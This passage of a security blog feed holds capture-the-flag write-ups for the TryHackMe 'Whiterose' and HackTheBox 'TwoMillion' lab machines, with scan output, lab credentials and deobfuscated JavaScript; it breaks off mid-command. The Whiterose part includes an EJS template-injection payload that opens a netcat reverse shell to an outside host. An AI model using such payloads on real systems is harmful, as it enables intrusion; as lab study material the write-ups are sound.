-lï¼šæ˜¾ç¤ºç›‘å¬çŠ¶æ€çš„å¥—æ¥å­—ã€‚</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/8aa72b85206e3564.png"></p><p>æ‰¾åˆ° IP</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">10.11.55.21</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q5-1"><a href="#Q5-1" class="headerlink" title="Q5"></a>Q5</h2><p>åŒæ ·æ‰¾åˆ°ç«¯å£</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">3333</span>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>åº”æ€¥å“åº”&amp;å–è¯</category>
      
      <category>ç„æœº</category>
      
    </categories>
    
    
    <tags>
      
      <tag>åº”æ€¥å“åº”</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>THM-Whiterose</title>
    <link href="/2025/03/19/THM-Whiterose/"/>
    <url>/2025/03/19/THM-Whiterose/</url>
    
    <content type="html"><![CDATA[<p>çƒ‚å°¾äº†ã€‚ã€‚ã€‚</p><span id="more"></span><h1 id="Whatâ€™s-Tyrell-Wellickâ€™s-phone-number"><a href="#Whatâ€™s-Tyrell-Wellickâ€™s-phone-number" class="headerlink" title="Whatâ€™s Tyrell Wellickâ€™s phone number?"></a>Whatâ€™s Tyrell Wellickâ€™s phone number?</h1><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cmd">â””â”€# nmap -sS -sV -Pn -A <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">218</span>.<span class="hljs-number">118</span><br>Starting Nmap <span class="hljs-number">7</span>.<span class="hljs-number">94</span>SVN ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">14</span>:<span class="hljs-number">58</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">218</span>.<span class="hljs-number">118</span><br>Host is up (<span class="hljs-number">0</span>.<span class="hljs-number">39</span>s latency).<br><span class="hljs-keyword">Not</span> shown: <span class="hljs-number">998</span> closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">7</span>.<span class="hljs-number">6</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0.<span class="hljs-number">7</span> (Ubuntu Linux; protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br>| ssh-hostkey:<br>|   <span class="hljs-number">2048</span> b9:<span class="hljs-number">07</span>:<span class="hljs-number">96</span>:<span class="hljs-number">0</span>d:c4:b6:<span class="hljs-number">0</span>c:d6:<span class="hljs-number">22</span>:<span class="hljs-number">1</span>a:e4:<span class="hljs-number">6</span>c:<span class="hljs-number">8</span>e:ac:<span class="hljs-number">6</span>f:<span class="hljs-number">7</span>d (RSA)<br>|   <span class="hljs-number">256</span> ba:ff:<span class="hljs-number">92</span>:<span class="hljs-number">3</span>e:<span class="hljs-number">0</span>f:<span class="hljs-number">03</span>:<span class="hljs-number">7</span>e:da:<span class="hljs-number">30</span>:ca:e3:<span class="hljs-number">52</span>:<span class="hljs-number">8</span>d:<span class="hljs-number">47</span>:d9:<span class="hljs-number">6</span>c (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">5</span>d:e4:<span class="hljs-number">14</span>:<span class="hljs-number">39</span>:ca:<span class="hljs-number">06</span>:<span class="hljs-number">17</span>:<span class="hljs-number">47</span>:<span class="hljs-number">93</span>:<span class="hljs-number">53</span>:<span class="hljs-number">86</span>:de:<span class="hljs-number">2</span>b:<span class="hljs-number">77</span>:<span class="hljs-number">09</span>:<span class="hljs-number">7</span>d (ED25519)<br><span class="hljs-number">80</span>/tcp open  http    nginx <span class="hljs-number">1</span>.<span class="hljs-number">14</span>.<span class="hljs-number">0</span> (Ubuntu)<br>|_http-server-header: nginx/<span class="hljs-number">1</span>.<span class="hljs-number">14</span>.<span class="hljs-number">0</span> (Ubuntu)<br>|_http-<span class="hljs-built_in">title</span>: Site doesn&#x27;t have a <span class="hljs-built_in">title</span> (text/html).<br>Aggressive OS guesses: Linux <span class="hljs-number">3</span>.<span class="hljs-number">1</span> (<span class="hljs-number">91</span>%), Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span> (<span class="hljs-number">91</span>%), AXIS <span class="hljs-number">210</span>A or <span class="hljs-number">211</span> Network Camera (Linux <span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">17</span>) (<span class="hljs-number">91</span>%), Linux <span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">32</span> (<span class="hljs-number">90</span>%), Linux <span class="hljs-number">3</span>.<span class="hljs-number">1</span> - <span class="hljs-number">3</span>.<span class="hljs-number">2</span> (<span class="hljs-number">90</span>%), Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span> - <span class="hljs-number">4</span>.<span class="hljs-number">9</span> (<span class="hljs-number">90</span>%), Linux <span class="hljs-number">3</span>.<span class="hljs-number">7</span> - <span class="hljs-number">3</span>.<span class="hljs-number">10</span> (<span class="hljs-number">90</span>%), Linux <span class="hljs-number">5</span>.<span class="hljs-number">0</span> - <span class="hljs-number">5</span>.<span class="hljs-number">5</span> (<span class="hljs-number">90</span>%), QNAP QTS <span class="hljs-number">4</span>.<span class="hljs-number">0</span> - <span class="hljs-number">4</span>.<span class="hljs-number">2</span> (<span class="hljs-number">90</span>%), ASUS RT-N56U WAP (Linux <span class="hljs-number">3</span>.<span class="hljs-number">4</span>) (<span class="hljs-number">89</span>%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (test conditions non-ideal).<br>Network Distance: <span class="hljs-number">3</span> hops<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE (using port <span class="hljs-number">8888</span>/tcp)<br>HOP RTT       ADDRESS<br><span class="hljs-number">1</span>   <span class="hljs-number">0</span>.<span class="hljs-number">34</span> ms   <span class="hljs-number">172</span>.<span class="hljs-number">30</span>.<span class="hljs-number">144</span>.<span class="hljs-number">1</span><br><span class="hljs-number">2</span>   <span class="hljs-number">389</span>.<span class="hljs-number">62</span> ms <span class="hljs-number">10</span>.<span class="hljs-number">21</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br><span class="hljs-number">3</span>   <span class="hljs-number">390</span>.<span class="hljs-number">09</span> ms <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">218</span>.<span class="hljs-number">118</span><br><br>OS and Service detection performed. Please report any incorrect results <span class="hljs-built_in">at</span> https://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">45</span>.<span class="hljs-number">53</span> seconds<br></code></pre></td></tr></table></figure><p>å¼€æ”¾äº† 80ï¼Œ22</p><p>è®¿é—® web ç½‘é¡µï¼Œå•¥ä¹Ÿæ²¡æœ‰</p><p><img src="https://img.dkdun.cn/v1/2025/12/faf3fe0510f50508.png"></p><p>åˆ©ç”¨ fuff æµ‹ä¸€ä¸‹æœ‰æ²¡æœ‰å­åŸŸå</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cmd">â””â”€# ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-<span class="hljs-number">5000</span>.txt -u http://cyprusbank.thm/ -H &quot;Host:FUZZ.cyprusbank.thm&quot; -fw <span class="hljs-number">1</span><br><br>        /&#x27;___\  /&#x27;___\           /&#x27;___\<br>       /\ \__/ /\ \__/  __  __  /\ \__/<br>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\<br>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/<br>         \ \_\   \ \_\  \ \____/  \ \_\<br>          \/_/    \/_/   \/___/    \/_/<br><br>       v2.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>-dev<br>________________________________________________<br><br> :: Method           : GET<br> :: URL              : http://cyprusbank.thm/<br> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-<span class="hljs-number">5000</span>.txt<br> :: Header           : Host: FUZZ.cyprusbank.thm<br> :: Follow redirects : false<br> :: Calibration      : false<br> :: Timeout          : <span class="hljs-number">10</span><br> :: Threads          : <span class="hljs-number">40</span><br> :: Matcher          : Response status: <span class="hljs-number">200</span>-<span class="hljs-number">299</span>,<span class="hljs-number">301</span>,<span class="hljs-number">302</span>,<span class="hljs-number">307</span>,<span class="hljs-number">401</span>,<span class="hljs-number">403</span>,<span class="hljs-number">405</span>,<span class="hljs-number">500</span><br> :: Filter           : Response words: <span class="hljs-number">1</span><br>________________________________________________<br><br>www                     [Status: <span class="hljs-number">200</span>, Size: <span class="hljs-number">252</span>, Words: <span class="hljs-number">19</span>, Lines: <span class="hljs-number">9</span>, Duration: <span class="hljs-number">447</span>ms]<br>admin                   [Status: <span class="hljs-number">302</span>, Size: <span class="hljs-number">28</span>, Words: <span class="hljs-number">4</span>, Lines: <span class="hljs-number">1</span>, Duration: <span class="hljs-number">447</span>ms]<br>:: Progress: [<span class="hljs-number">4989</span>/<span class="hljs-number">4989</span>] :: Job [<span class="hljs-number">1</span>/<span class="hljs-number">1</span>] :: <span class="hljs-number">89</span> req/sec :: Duration: [<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">56</span>] :: Errors: <span class="hljs-number">0</span> :<br></code></pre></td></tr></table></figure><p>æœ‰ä¸¤ä¸ª</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">www<span class="hljs-selector-class">.cyprusbank</span><span class="hljs-selector-class">.thm</span><br>admin<span class="hljs-selector-class">.cyprusbank</span>.thm<br></code></pre></td></tr></table></figure><p>åœ¨ <code>admin.cyprusbank.thm</code> ç«™ç‚¹ä¸Šæœ‰ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œç”¨ç»™å‡ºçš„ç”¨æˆ·å¯†ç ç™»å½•è¿›å»</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">Olivia</span> <span class="hljs-title class_">Cortez</span><span class="hljs-symbol">:olivi8</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¸€äº›è´¦æˆ·ä¿¡æ¯ä½†æ˜¯çœ‹ä¸åˆ°å…·ä½“çš„ï¼Œåœ¨ Message é¡µé¢èƒ½çœ‹åˆ°ä¸€äº›æ¶ˆæ¯ï¼Œè€Œä¸”å¯ä»¥å‘ç° url æœ‰ <code>?c=5</code> è¿™ç§ï¼Œå°è¯•æ”¹å˜é¡µé¢ï¼Œå½“ <code>?c=0</code> æ—¶æœ‰ç®¡ç†å‘˜è´¦æˆ·ä¿¡æ¯</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">Gayle</span> <span class="hljs-title class_">Bev</span><span class="hljs-symbol">:p~</span>]P<span class="hljs-variable">@5</span>!<span class="hljs-number">6</span>;<span class="hljs-symbol">rs558:</span>q<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/06d1a03a1b3e9912.png"></p><p>ç™»å½•è¿›å»å°±èƒ½çœ‹åˆ°è´¦æˆ·ä¿¡æ¯</p><p><img src="https://img.dkdun.cn/v1/2025/12/83ba8e33fefd774e.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Tyrell</span> Wellick:<span class="hljs-number">842</span>-<span class="hljs-number">029</span>-<span class="hljs-number">5701</span><br></code></pre></td></tr></table></figure><h1 id="What-is-the-user-txt-flag"><a href="#What-is-the-user-txt-flag" class="headerlink" title="What is the user.txt flag?"></a>What is the user.txt flag?</h1><p><code>Setting</code> æ å¯ä»¥ä¿®æ”¹ç”¨æˆ·è´¦å·å¯†ç </p><p><img src="https://img.dkdun.cn/v1/2025/12/8a257a1fc4a3b305.png"></p><p>ç„¶åç”¨ Bp æ‹¦æˆªï¼Œå‘ç°æŠŠ <code>password</code> å­—æ®µæ”¹äº†ä¹‹åä¼šå›æ˜¾æŠ¥é”™</p><p><img src="https://img.dkdun.cn/v1/2025/12/801b2b1ac29262f7.png"></p><p><code>ejs</code> æŠ¥é”™,å¯ä»¥åœ¨ç½‘ä¸Šæœåˆ° CVE-2022-29078ï¼Œ<a href="https://xz.aliyun.com/news/11769">Ejs æ¨¡æ¿å¼•æ“æ³¨å…¥å®ç° RCE</a></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">name=admin&amp;password=<span class="hljs-number">111</span>&amp;settings[view options][outputFunctionName]=x;process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;busybox nc <span class="hljs-number">10</span>.<span class="hljs-number">21</span>.<span class="hljs-number">118</span>.<span class="hljs-number">213</span> <span class="hljs-number">1234</span> -e bash&#x27;);s<br></code></pre></td></tr></table></figure><p>ç›‘å¬æ‹¿åˆ° flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">THM</span>&#123;<span class="hljs-number">4</span>lways_upd4te_uR_d3p3nd3nc!<span class="hljs-number">3</span>s&#125;<br></code></pre></td></tr></table></figure><h1 id="What-is-the-root-txt-flag"><a href="#What-is-the-root-txt-flag" class="headerlink" title="What is the root.txt flag?"></a>What is the root.txt flag?</h1><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs elixir">sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> web on <span class="hljs-symbol">cyprusbank:</span><br>    env_keep+=<span class="hljs-string">&quot;LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET&quot;</span>, env_keep+=<span class="hljs-string">&quot;XAPPLRESDIR</span><br><span class="hljs-string">    XFILESEARCHPATH XUSERFILESEARCHPATH&quot;</span>,<br>    secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>,<br>    mail_badpass<br><br><span class="hljs-title class_">User</span> web may run the following commands on <span class="hljs-symbol">cyprusbank:</span><br>    (root) <span class="hljs-symbol">NOPASSWD:</span> sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm<br></code></pre></td></tr></table></figure><p>å‘ç° <code>sudoedit</code> å¯ä»¥ sudo ææƒã€‚åé¢çš„æ–‡ä»¶å†™ä¸è¿›å»æœäº†ã€‚ã€‚ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€</category>
      
      <category>é¶æœº</category>
      
      <category>THM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>THM æ¸—é€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-TwoMillion</title>
    <link href="/2025/03/19/HTB-TwoMillion/"/>
    <url>/2025/03/19/HTB-TwoMillion/</url>
    
    <content type="html"><![CDATA[<p>API è¶Šæƒã€å‘½ä»¤æ‰§è¡Œã€CVE-2023-0386</p><span id="more"></span><h1 id="Task-1"><a href="#Task-1" class="headerlink" title="Task 1"></a>Task 1</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">â””â”€# nmap -sS -sV -A -Pn 10.10.11.221<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-17 21:25 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.221<br>Host is up (0.35s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)<br>|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)<br>80/tcp open  http    nginx<br>|_http-title: Did not follow redirect to http://2million.htb/<br>No exact OS matches <span class="hljs-keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).<br>TCP/IP fingerprint:<br>OS:SCAN(V=7.94SVN%E=4%D=3/17%OT=22%CT=1%CU=38870%PV=Y%DS=3%DC=T%G=Y%TM=67D8<br>OS:22FA%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)SEQ(S<br>OS:P=107%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=107%GCD=2%ISR=10D%TI=Z%CI<br>OS:=Z%II=I%TS=A)OPS(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST<br>OS:11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=<br>OS:FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T<br>OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R<br>OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=<br>OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0<br>OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=7F7%RUD=G)IE<br>OS:(R=Y%DFI=N%T=40%CD=S)<br><br>Network Distance: 3 hops<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE (using port 8080/tcp)<br>HOP RTT       ADDRESS<br>1   0.28 ms   172.30.144.1<br>2   442.86 ms 10.10.16.1<br>3   442.97 ms 10.10.11.221<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 59.39 seconds<br></code></pre></td></tr></table></figure><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs inform7">How many TCP ports <span class="hljs-keyword">are</span> <span class="hljs-keyword">open</span>?<br>:2<br></code></pre></td></tr></table></figure><h1 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h1><p>f12 æŸ¥çœ‹æºç ï¼Œæ‰¾åˆ°äº† <code>inviteapi.min.js</code></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> name <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> JavaScript <span class="hljs-built_in">file</span> loaded <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> /invite page that has <span class="hljs-built_in">to</span> <span class="hljs-built_in">do</span> <span class="hljs-keyword">with</span> invite codes?<br>:inviteapi.<span class="hljs-built_in">min</span>.js<br></code></pre></td></tr></table></figure><h1 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">p, a, c, k, e, d</span>) &#123;<br>    e = <span class="hljs-keyword">function</span>(<span class="hljs-params">c</span>) &#123;<br>        <span class="hljs-keyword">return</span> c.<span class="hljs-title function_">toString</span>(<span class="hljs-number">36</span>)<br>    &#125;<br>    ;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^/</span>, <span class="hljs-title class_">String</span>)) &#123;<br>        <span class="hljs-keyword">while</span> (c--) &#123;<br>            d[c.<span class="hljs-title function_">toString</span>(a)] = k[c] || c.<span class="hljs-title function_">toString</span>(a)<br>        &#125;<br>        k = [<span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) &#123;<br>            <span class="hljs-keyword">return</span> d[e]<br>        &#125;<br>        ];<br>        e = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\\w+&#x27;</span><br>        &#125;<br>        ;<br>        c = <span class="hljs-number">1</span><br>    &#125;<br>    ;<span class="hljs-keyword">while</span> (c--) &#123;<br>        <span class="hljs-keyword">if</span> (k[c]) &#123;<br>            p = p.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">&#x27;\\b&#x27;</span> + <span class="hljs-title function_">e</span>(c) + <span class="hljs-string">&#x27;\\b&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>), k[c])<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> p<br>&#125;(<span class="hljs-string">&#x27;1 i(4)&#123;h 8=&#123;&quot;4&quot;:4&#125;;$.9(&#123;a:&quot;7&quot;,5:&quot;6&quot;,g:8,b:\&#x27;/d/e/n\&#x27;,c:1(0)&#123;3.2(0)&#125;,f:1(0)&#123;3.2(0)&#125;&#125;)&#125;1 j()&#123;$.9(&#123;a:&quot;7&quot;,5:&quot;6&quot;,b:\&#x27;/d/e/k/l/m\&#x27;,c:1(0)&#123;3.2(0)&#125;,f:1(0)&#123;3.2(0)&#125;&#125;)&#125;&#x27;</span>, <span class="hljs-number">24</span>, <span class="hljs-number">24</span>, <span class="hljs-string">&#x27;response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify&#x27;</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;|&#x27;</span>), <span class="hljs-number">0</span>, &#123;&#125;))<br><br></code></pre></td></tr></table></figure><p>åæ··æ·†å</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">verifyInviteCode</span>(<span class="hljs-params">code</span>) &#123;<br>    <span class="hljs-keyword">var</span> formData = &#123; <span class="hljs-string">&quot;code&quot;</span>: code &#125;;<br>    $.<span class="hljs-title function_">ajax</span>(&#123;<br>        <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>        <span class="hljs-attr">dataType</span>: <span class="hljs-string">&quot;json&quot;</span>,<br>        <span class="hljs-attr">data</span>: formData,<br>        <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;/api/v1/invite/verify&#x27;</span>,<br>        <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response);<br>        &#125;,<br>        <span class="hljs-attr">error</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response);<br>        &#125;<br>    &#125;);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">makeInviteCode</span>(<span class="hljs-params"></span>) &#123;<br>    $.<span class="hljs-title function_">ajax</span>(&#123;<br>        <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>        <span class="hljs-attr">dataType</span>: <span class="hljs-string">&quot;json&quot;</span>,<br>        <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;/api/v1/invite/how/to/generate&#x27;</span>,<br>        <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response);<br>        &#125;,<br>        <span class="hljs-attr">error</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response);<br>        &#125;<br>    &#125;);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°è·¯å¾„åç§°</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What JavaScript function <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> invite page returns <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> hint <span class="hljs-keyword">about</span> how <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> an invite code? Don&#x27;t include () <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> answer.<br>:makeInviteCode<br></code></pre></td></tr></table></figure><h1 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h1><p>POST è¯·æ±‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">â””â”€# curl -X POST http://2million.htb/api/v1/invite/generate<br>&#123;<span 